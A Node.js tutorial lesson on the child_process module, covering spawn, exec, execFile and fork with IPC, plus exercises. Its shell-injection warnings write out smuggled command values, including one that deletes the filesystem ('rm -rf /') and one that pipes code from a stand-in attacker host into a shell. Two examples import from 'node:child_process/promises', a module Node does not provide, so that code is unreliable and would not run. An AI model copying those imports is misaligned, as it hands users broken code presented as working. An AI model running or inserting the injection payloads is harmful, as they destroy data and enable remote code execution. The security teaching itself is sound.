registerLessonSrc("25-child-process", function () {/*
---
id: 25-child-process
title: "child_process: spawn, exec, fork & IPC"
minutes: 24
level: advanced
objectives:
  - Distinguish spawn, exec, execFile, and fork and choose the right one
  - Stream output from long-running child processes with spawn
  - Use fork to create IPC channels and pass structured messages
  - Recognise and avoid shell injection when building commands
---

# child_process: spawn, exec, fork & IPC

## Why this matters

Every real Node application eventually needs to shell out — run a compiler, invoke a Python script, call `ffmpeg`, or launch a sibling Node process. The `child_process` module is the gatekeeper for that. Understanding its four launchers means the difference between a leaky subprocess and a clean, observable pipeline; between a secure command builder and a shell-injection vulnerability hiding in plain sight.

## Learning objectives

- Explain the difference between `spawn`, `exec`, `execFile`, and `fork`.
- Stream stdout/stderr from long-running processes using `spawn`.
- Establish an IPC channel with `fork` and exchange structured messages.
- Identify shell injection risk and write commands safely.

## The four launchers

Node's `child_process` module exposes four ways to start a process. Each is a variation on the same underlying system call but with different ergonomics and capabilities:

| Function    | Shell? | Buffered? | IPC? | Best for |
|-------------|--------|-----------|------|----------|
| `exec`      | yes    | yes       | no   | short commands, trusted input |
| `execFile`  | no     | yes       | no   | binary with known args |
| `spawn`     | no     | no        | no   | streaming, long-running, large output |
| `fork`      | no     | no        | yes  | sibling Node processes with messaging |

> [!NOTE] All four are in `node:child_process`
> Import with `import { spawn, exec, execFile, fork } from 'node:child_process'` or the promisified versions via `import { promisify } from 'node:util'`.

## exec — buffered, shell-enabled

`exec(command, callback)` runs your command string through the system shell (`/bin/sh` on Linux/macOS, `cmd.exe` on Windows). The shell interprets pipelines, globs, and redirections. The entire stdout and stderr are buffered in memory and handed back in a callback.

```js
import { exec } from 'node:child_process';

exec('ls -lh /tmp | head -5', (err, stdout, stderr) => {
  if (err) {
    console.error('Exit code:', err.code);
    console.error(stderr);
    return;
  }
  console.log(stdout);
});
```

> [!OUTPUT]
> total 48K
> drwxr-xr-x  2 root root 4.0K Jun  6 10:00 .
> drwxr-xr-x 20 root root 4.0K Jun  6 10:00 ..

`exec` also comes in a promisified form from `util.promisify` or directly from `child_process/promises`:

```js
import { exec } from 'node:child_process/promises';

const { stdout } = await exec('node --version');
console.log(stdout.trim()); // v24.0.0
```

> [!WARNING] Buffering limit
> By default `exec` caps buffered output at 1 MB (`maxBuffer` option). Exceed it and the process is killed. Use `spawn` for large or streaming output.

## spawn — streaming, no shell

`spawn(command, args, options)` starts the process **without a shell**. Instead of one command string, you pass the binary and its arguments as separate values. stdout and stderr come back as Node.js `Readable` streams — perfect for large or continuous output.

```js
import { spawn } from 'node:child_process';

const ls = spawn('ls', ['-lh', '/tmp']);

ls.stdout.on('data', (chunk) => {
  process.stdout.write(chunk);
});

ls.stderr.on('data', (chunk) => {
  process.stderr.write(chunk);
});

ls.on('close', (code) => {
  console.log(`Child exited with code ${code}`);
});
```

> [!OUTPUT]
> total 48K
> drwxr-xr-x  2 root root 4.0K Jun  6 10:00 .
> Child exited with code 0

### stdio option

The third argument to `spawn` accepts a `stdio` array or string controlling stdin/stdout/stderr:

```js
// 'inherit' connects the child's streams directly to the parent's terminal
const child = spawn('npm', ['test'], { stdio: 'inherit' });

// 'pipe' is the default — gives you stream objects
const child2 = spawn('cat', ['large.log'], { stdio: ['ignore', 'pipe', 'inherit'] });
// stdin ignored, stdout piped, stderr inherits parent
```

> [!PRINCIPAL] Prefer spawn for production pipelines
> `exec` collects all output in one buffer; a 100 MB log file would need 100 MB of RAM before you see a single byte. `spawn` lets you process each chunk as it arrives — composing streams, piping to a file, or emitting events — with constant memory overhead. This is the same principle behind Node's streams everywhere: backpressure-aware, O(1) memory.

## execFile — no shell, buffered

`execFile` is like `exec` but skips the shell, similar to `spawn`. Use it when you don't need streaming and the arguments are well-known:

```js
import { execFile } from 'node:child_process/promises';

const { stdout } = await execFile('node', ['--version']);
console.log(stdout.trim()); // v24.0.0
```

## fork — Node-to-Node IPC

`fork(modulePath, args?, options?)` is `spawn` with an extra superpower: it automatically creates an **IPC (Inter-Process Communication) channel** between parent and child. Both sides can call `.send(msg)` and listen to `'message'` events to exchange structured JSON-serialisable values.

```js
// parent.mjs
import { fork } from 'node:child_process';

const worker = fork('./worker.mjs');

worker.send({ task: 'compute', n: 40 });

worker.on('message', (result) => {
  console.log('Result from child:', result);
  worker.kill();
});

worker.on('exit', (code) => {
  console.log('Worker exited:', code);
});
```

```js
// worker.mjs
process.on('message', ({ task, n }) => {
  if (task === 'compute') {
    // Simulating CPU work — a Fibonacci calculation
    function fib(x) { return x <= 1 ? x : fib(x - 1) + fib(x - 2); }
    process.send({ result: fib(n) });
  }
});
```

> [!OUTPUT]
> Result from child: 102334155
> Worker exited: null

The IPC channel is a full-duplex stream serialised through JSON. You can pass any JSON-serialisable value — objects, arrays, numbers. Sending functions or class instances won't work (they're not JSON-serialisable).

> [!NOTE] fork vs worker_threads for Node-to-Node work
> `fork` gives you process-level isolation (separate V8 heap, crash doesn't take down the parent) but has higher overhead than `worker_threads`. For pure CPU-bound JavaScript that doesn't need isolation, prefer `worker_threads`. Reserve `fork` for tasks that need separate memory spaces, native addon isolation, or running different Node module versions.

## Shell injection — the hidden danger

Because `exec` passes your command to the shell, **any user-controlled content in that string is a security vulnerability**. The shell sees semicolons, backticks, `&&`, `||`, `|`, and `$(...)` as special.

```js
// DANGEROUS — never do this:
const userInput = 'hello; rm -rf /';
exec(`echo ${userInput}`);  // rm -rf / runs as a shell command!
```

The fix is almost always to switch to `spawn` or `execFile` and pass arguments as a separate array. The array is passed directly to the OS, bypassing the shell entirely:

```js
// SAFE — arguments are never interpreted by a shell:
spawn('echo', [userInput]);
```

> [!PITFALL] The tempting `exec` one-liner
> It's easy to write `exec(\`git log --oneline ${branch}\`)` when `branch` comes from user input. A value like `main; curl attacker.com | sh` turns your service into a remote code execution vector. Always use `spawn`/`execFile` with separate args arrays for any input you don't fully control.

## Try it yourself

The core of IPC is a **message-passing protocol** — a sender, a receiver, and a structured message format. In the browser sandbox we can simulate two "processes" as objects exchanging messages through a shared queue:

```js run
// Simulated two-process IPC using a shared message queue.
// Each "process" has a send() method and an onMessage handler.

function createProcess(name, handler) {
  return { name, handler, inbox: [], peer: null };
}

function link(a, b) {
  a.peer = b;
  b.peer = a;
}

function send(sender, msg) {
  const envelope = { from: sender.name, payload: msg };
  sender.peer.inbox.push(envelope);
  // Deliver synchronously (event loop tick simulation)
  const { from, payload } = sender.peer.inbox.shift();
  console.log(`[${sender.peer.name}] received from ${from}:`, JSON.stringify(payload));
  sender.peer.handler(payload, (reply) => send(sender.peer, reply));
}

// --- Child process logic ---
const child = createProcess('worker', (msg, reply) => {
  if (msg.task === 'fibonacci') {
    function fib(n) { return n <= 1 ? n : fib(n - 1) + fib(n - 2); }
    reply({ result: fib(msg.n) });
  }
});

// --- Parent process logic ---
const parent = createProcess('parent', (msg, _reply) => {
  console.log(`[parent] final answer: fib(${10}) = ${msg.result}`);
});

link(parent, child);

// Parent initiates the conversation
send(parent, { task: 'fibonacci', n: 10 });
```

## Exercises

**Exercise 1:** Extend the simulated IPC protocol above to support a `ping` task. When the child receives `{ task: 'ping' }`, it should reply with `{ pong: true, timestamp: Date.now() }`. Log the round-trip time in the parent's handler.

<details>
<summary>Show solution</summary>

```js run
function createProcess(name, handler) {
  return { name, handler, inbox: [], peer: null };
}
function link(a, b) { a.peer = b; b.peer = a; }
function send(sender, msg) {
  const envelope = { from: sender.name, payload: msg };
  sender.peer.inbox.push(envelope);
  const { from, payload } = sender.peer.inbox.shift();
  sender.peer.handler(payload, (reply) => send(sender.peer, reply));
}

const child = createProcess('worker', (msg, reply) => {
  if (msg.task === 'ping') {
    reply({ pong: true, timestamp: Date.now() });
  }
});

const parent = createProcess('parent', (msg, _reply) => {
  const rtt = Date.now() - msg.timestamp;
  console.log('pong received, approx RTT:', rtt, 'ms');
});

link(parent, child);
const start = Date.now();
send(parent, { task: 'ping' });
console.log('ping sent at', start);
```

</details>

**Exercise 2:** In the simulated protocol, add a simple **request ID** so the parent can match replies to their original requests. Send two concurrent tasks (`fibonacci n=5` and `fibonacci n=8`) and confirm both replies arrive with the correct IDs.

<details>
<summary>Show solution</summary>

```js run
function createProcess(name, handler) {
  return { name, handler, peer: null };
}
function link(a, b) { a.peer = b; b.peer = a; }
function deliver(target, from, payload) {
  target.handler(payload, (reply) => deliver(target.peer, target.name, reply));
}

const child = createProcess('worker', (msg, reply) => {
  function fib(n) { return n <= 1 ? n : fib(n - 1) + fib(n - 2); }
  reply({ id: msg.id, result: fib(msg.n) });
});

const parent = createProcess('parent', (msg, _reply) => {
  console.log(`Reply for request #${msg.id}: ${msg.result}`);
});

link(parent, child);

// Send two "concurrent" requests with unique IDs
deliver(child, 'parent', { id: 1, n: 5 });
deliver(child, 'parent', { id: 2, n: 8 });
```

</details>

## Common pitfalls

> [!PITFALL] Forgetting to handle `'error'` and `'close'` events
> A `spawn`ed process that fails to start (wrong path, permission denied) emits `'error'`. If you only listen to `'close'`, the error is silently swallowed. Always attach both `child.on('error', ...)` and `child.on('close', ...)` handlers. Similarly, `exec` callback's `err` is non-null for both spawn errors and non-zero exit codes — check `err.code` vs `err.killed` to distinguish them.

Unbuffered large stderr is another trap: if you `pipe` stderr but never read it, the OS pipe buffer fills up and your child process hangs waiting to write. Always consume all streams.

## What you learned

- `exec` uses a shell and buffers output — convenient but limited and risky with user input.
- `spawn` skips the shell and streams stdio — the right choice for large or long-running output.
- `execFile` is `exec` without a shell — use when you want buffered results without injection risk.
- `fork` creates a sibling Node process with a built-in IPC channel using `.send()` and `'message'` events.
- Passing user input to `exec` as part of the command string is a shell injection vulnerability; always use `spawn`/`execFile` with a separate args array.
- Handle both `'error'` and `'close'` events, and always consume all piped streams.

## Next steps

Running one child process is useful, but scaling to many requires coordinated process management. Next up: the `cluster` module, which lets a single Node program fork a worker per CPU core and share a listening port between them — the foundation of multi-core HTTP servers.
*/});
